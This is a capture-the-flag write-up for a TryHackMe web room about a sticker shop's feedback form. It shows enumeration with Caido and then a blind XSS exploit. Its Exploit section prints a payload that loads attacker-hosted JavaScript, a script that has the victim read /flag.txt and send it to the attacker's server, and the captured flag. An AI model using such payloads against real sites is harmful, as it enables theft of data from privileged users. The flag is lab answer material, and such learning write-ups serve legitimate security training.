- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

The flag .
# Scenario

Your local sticker shop has finally developed its own [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) .  They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

# Enumeration
## Caido

We can use [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md)  like [BurpSuite](../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md), intercepting the requests at the http://stickershop.thm/ after we added it to our /etc/hosts file :

![2e168f632a775e68ca39a83fd08b607c.png](../../2%20-%20Resources/Others/Flameshots/2e168f632a775e68ca39a83fd08b607c.png)

we can try to ping the machine :

![ff11db89e4605e9f0599d1282b453589.png](../../2%20-%20Resources/Others/Flameshots/ff11db89e4605e9f0599d1282b453589.png)

<img src="../../Flameshots/805698ddf4c7cdffb0434ae5e08f2eca.png" alt="805698ddf4c7cdffb0434ae5e08f2eca.png" width="471" height="201" class="jop-noMdConv">

We can't see the page , so we try to intercept the request with **Caido**, to do that i will go to the Intercept page in 'Proxy' and open the buitin browser :

<img src="../../Flameshots/454f54e367c339416eb74af6eb02b075.png" alt="454f54e367c339416eb74af6eb02b075.png" width="587" height="181" class="jop-noMdConv">

and we can see we have no response .

If we look on THM we can see the flag is on port 8080 so we try that and we get 401 Unauthorized:

<img src="../../Flameshots/5df227e017a464f0c10b1b43fea8d128.png" alt="5df227e017a464f0c10b1b43fea8d128.png" width="332" height="160" class="jop-noMdConv">

If we go to the main page on 8080 :

<img src="../../Flameshots/05e2e53e0fafbb66d648337904fa240c.png" alt="05e2e53e0fafbb66d648337904fa240c.png" width="335" height="335" class="jop-noMdConv">

So we have our shop, now we go in Feedback :

<img src="../../Flameshots/3c8e9e7d95eb8d01d1fde6ed4b633bec.png" alt="3c8e9e7d95eb8d01d1fde6ed4b633bec.png" width="390" height="291" class="jop-noMdConv">

And we have a prompt, let's intercept a request with Caido :

<img src="../../Flameshots/08a55a32e2adbf1de5e743e6f1207b8c.png" alt="08a55a32e2adbf1de5e743e6f1207b8c.png" width="468" height="343" class="jop-noMdConv">

Now we send it over to **Replay :**

<img src="../../Flameshots/2994e97ec7146eeb78125b34fad2a1a8.png" alt="2994e97ec7146eeb78125b34fad2a1a8.png" width="314" height="130" class="jop-noMdConv">

We can click on Send and analyze the Response code:

<img src="../../Flameshots/889269d9dabe785d499320a84c7191a4.png" alt="889269d9dabe785d499320a84c7191a4.png" width="549" height="416" class="jop-noMdConv">

It says '<span style="color: rgb(224, 62, 45);">Thanks for your feedback! It will be <span style="color: rgb(45, 194, 107);">evaluated</span> shortly by our staff<span style="color: rgb(255, 255, 255);">'</span> <span style="color: rgb(255, 255, 255);">so we may think there's some XSS.</span></span>

# Exploit

<span style="color: rgb(224, 62, 45);"><span style="color: rgb(255, 255, 255);">We can try to use Tyler Ramsbey script in JS and it will automatically catch the flag once the victim user click flag.txt :</span></span>

<img src="../../Flameshots/7d021226144879cdd810f3c57a3a764b.png" alt="7d021226144879cdd810f3c57a3a764b.png" width="258" height="238" class="jop-noMdConv">

We download and make it executable with `sudo chmod +x xss-extract.py` and run it :

```
┌──(mdn0x㉿mdn0xKali)-[~/Scaricati]
└─$ python3 xss-extract.py -h   
usage: xss-extract.py [-h] -d DIRECTORY -i IP

This script will generate a malicious .js file. When this is used in an XSS attack, it will
cause the victim to navigate to the target directory and send the content to the attacker.
This is useful if the victim is an admin or privileged user with access to sensitive
information. Only use with permission. The XSS payload is <script src=http://[attacker-
ip]/script.js></script>

options:
  -h, --help            show this help message and exit
  -d, --directory DIRECTORY
                        Target Directory
  -i, --ip IP           Attacker IP Address

```

So we have the syntax for our flag :

```
┌──(mdn0x㉿mdn0xKali)-[~/Scaricati]
└─$ python3 xss-extract.py -d /flag.txt -i 10.10.16.67
JavaScript code has been written to script.js

```

Now we can open our [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) web [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/Scaricati]
└─$ python3 -m http.server 80                         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now we grab the [Script](../../3%20-%20Tags/Hacking%20Concepts/Script.md) from -h and we paste it in the online prompt, we change attacker_ip in our machine ip and submit it :

<img src="../../Flameshots/0c419d748fd3d5d05b811ed66e6303cb.png" alt="0c419d748fd3d5d05b811ed66e6303cb.png" width="422" height="194">

This is executing [Javascript](../../3%20-%20Tags/Programming%20Languages/Javascript.md) and when the user click on the flag we have it :

**THM{83789a69074f636f64a38879cfcabe8b62305ee6}**
